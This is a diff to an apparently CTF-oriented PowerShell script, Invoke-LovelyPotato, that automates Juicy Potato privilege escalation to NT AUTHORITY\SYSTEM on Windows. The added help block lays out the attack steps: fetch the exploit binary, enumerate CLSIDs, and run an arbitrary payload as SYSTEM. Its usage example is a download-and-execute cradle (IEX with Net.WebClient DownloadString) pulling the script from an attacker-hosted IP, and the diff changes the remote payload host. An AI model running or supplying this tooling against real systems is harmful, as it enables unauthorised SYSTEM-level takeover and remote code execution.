@@ -1,7 +1,26 @@
 function Invoke-LovelyPotato
 {
+<#
+.SYNOPSIS
+Powershell script which automates the process of Juicy Potato local privilege escalation.
+
+.DESCRIPTION
+This script involves three major steps:
+1. Downloads Juicy Potato static binary, CLSID enumeration script and an arbitrary binary which to be ran as NT AUTHORITY\SYSTEM.
+2. Runs CLSID enumeration script in the background.
+3. Launches Juicy Potato exploit for every CLSID with NT AUTHORITY\SYSTEM privilege found.
+
+.EXAMPLE
+PS > IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-LovelyPotato.ps1')
+
+.NOTES
+You must first read README.md and follow the instruction for initial setup or else this script will fail.
+
+.LINK
+https://github.com/TsukiCTF/Lovely-Potato
+#>
 	# Configuration
-	$RemoteDir = "http://10.10.14.28"
+	$RemoteDir = "http://10.10.10.10"
 	$LocalPath = "c:\windows\system32\spool\drivers\color"
 
 	# Download necessary files for exploitation
@@ -24,3 +43,4 @@ function Invoke-LovelyPotato
 }
 
 Invoke-LovelyPotato
+
